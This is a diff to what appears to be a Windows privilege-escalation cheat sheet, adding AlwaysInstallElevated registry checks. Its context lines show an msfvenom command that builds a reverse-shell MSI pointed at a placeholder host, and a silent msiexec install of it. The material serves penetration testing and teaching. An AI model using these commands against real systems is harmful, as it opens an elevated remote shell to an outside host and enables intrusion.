@@ -1910,6 +1910,8 @@ C:\> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManager
 ```
 C:\> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
 C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 $ msfvenom -p windows/shell_reverse_tcp LHOST=<IP address> LPORT=<port> -f msi > aie.msi
 C:\> msiexec /i c:\Users\Public\Desktop\aie.msi /quiet /qn /norestart
 ```
